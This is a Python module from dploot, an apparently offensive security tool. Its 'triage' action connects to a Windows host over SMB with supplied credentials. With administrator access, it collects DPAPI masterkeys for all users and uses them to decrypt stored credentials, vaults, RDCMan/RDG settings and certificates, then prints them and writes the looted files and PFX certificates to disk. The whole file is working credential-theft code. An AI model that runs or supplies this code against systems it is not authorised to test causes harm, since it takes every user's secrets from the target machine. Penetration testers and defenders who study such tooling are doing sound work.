import argparse
import logging
import sys
from typing import Callable, Tuple
from dploot.action.masterkeys import (
    add_masterkeys_argument_group,
    parse_masterkeys_options,
)

from dploot.lib.smb import DPLootSMBConnection
from dploot.lib.target import Target, add_target_argument_group
from dploot.lib.utils import dump_looted_files_to_disk, handle_outputdir_option
from dploot.triage.certificates import CertificatesTriage
from dploot.triage.credentials import CredentialsTriage
from dploot.triage.masterkeys import MasterkeysTriage, parse_masterkey_file
from dploot.triage.rdg import RDGTriage
from dploot.triage.vaults import VaultsTriage

NAME = "triage"


class TriageAction:
    def __init__(self, options: argparse.Namespace) -> None:
        self.options = options
        self.target = Target.from_options(options)

        self.conn = None
        self._is_admin = None
        self.outputdir = None
        self.masterkeys = None
        self.pvkbytes = None
        self.passwords = None
        self.nthashes = None

        self.outputdir = handle_outputdir_option(directory=self.options.export_dir)

        if self.options.mkfile is not None:
            try:
                self.masterkeys = parse_masterkey_file(self.options.mkfile)
            except Exception as e:
                logging.error(str(e))
                sys.exit(1)

        self.pvkbytes, self.passwords, self.nthashes = parse_masterkeys_options(
            self.options, self.target
        )

    def connect(self) -> None:
        self.conn = DPLootSMBConnection(self.target)
        if self.conn.connect() is None:
            logging.error("Could not connect to %s" % self.target.address)
            sys.exit(1)

    def run(self) -> None:
        self.connect()
        logging.info(
            "Connected to {} as {}\\{} {}\n".format(
                self.target.address,
                self.target.domain,
                self.target.username,
                ("(admin)" if self.is_admin else ""),
            )
        )

        if self.is_admin:
            if self.masterkeys is None:

                def masterkey_callback(masterkey):
                    masterkey.dump()

                masterkeys_triage = MasterkeysTriage(
                    target=self.target,
                    conn=self.conn,
                    pvkbytes=self.pvkbytes,
                    nthashes=self.nthashes,
                    passwords=self.passwords,
                    per_masterkey_callback=masterkey_callback
                    if not self.options.quiet
                    else None,
                )
                logging.info("Triage ALL USERS masterkeys\n")
                self.masterkeys = masterkeys_triage.triage_masterkeys()
                print()
                if self.outputdir is not None:
                    dump_looted_files_to_disk(self.outputdir, masterkeys_triage.looted_files)

            def credential_callback(credential):
                if self.options.quiet:
                    credential.dump_quiet()
                else:
                    credential.dump()

            credentials_triage = CredentialsTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_credential_callback=credential_callback,
            )
            logging.info("Triage Credentials for ALL USERS\n")
            credentials_triage.triage_credentials()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, credentials_triage.looted_files)

            vaults_triage = VaultsTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_vault_callback=credential_callback,
            )
            logging.info("Triage Vaults for ALL USERS\n")
            vaults_triage.triage_vaults()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, vaults_triage.looted_files)

            rdg_triage = RDGTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_credential_callback=credential_callback,
            )
            logging.info("Triage RDCMAN Settings and RDG files for ALL USERS\n")
            rdg_triage.triage_rdcman()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, rdg_triage.looted_files)

            def certificate_callback(certificate):
                if not self.options.dump_all and not certificate.clientauth:
                    return
                if not self.options.quiet:
                    certificate.dump()
                filename = f"{certificate.username}_{certificate.filename[:16]}.pfx"
                logging.critical("Writting certificate to %s" % filename)
                with open(filename, "wb") as f:
                    f.write(certificate.pfx)

            certificates_triage = CertificatesTriage(
                target=self.target,
                conn=self.conn,
                masterkeys=self.masterkeys,
                per_certificate_callback=certificate_callback,
            )
            logging.info("Triage Certificates for ALL USERS\n")
            certificates_triage.triage_certificates()
            if self.outputdir is not None:
                dump_looted_files_to_disk(self.outputdir, certificates_triage.looted_files)
        else:
            logging.info("Not an admin, exiting...")

    @property
    def is_admin(self) -> bool:
        if self._is_admin is not None:
            return self._is_admin

        self._is_admin = self.conn.is_admin()
        return self._is_admin


def entry(options: argparse.Namespace) -> None:
    a = TriageAction(options)
    a.run()


def add_subparser(subparsers: argparse._SubParsersAction) -> Tuple[str, Callable]:
    subparser = subparsers.add_parser(
        NAME,
        help="Loot Masterkeys (if not set), credentials, rdg, certificates, browser and vaults from local or remote target",
    )

    group = subparser.add_argument_group("triage options")

    group.add_argument(
        "-mkfile",
        action="store",
        help=("File containing {GUID}:SHA1 masterkeys mappings"),
    )

    add_masterkeys_argument_group(group)

    group.add_argument(
        "-dump-all",
        action="store_true",
        help=("Dump also certificates not used for client authentication"),
    )

    add_target_argument_group(subparser)

    return NAME, entry
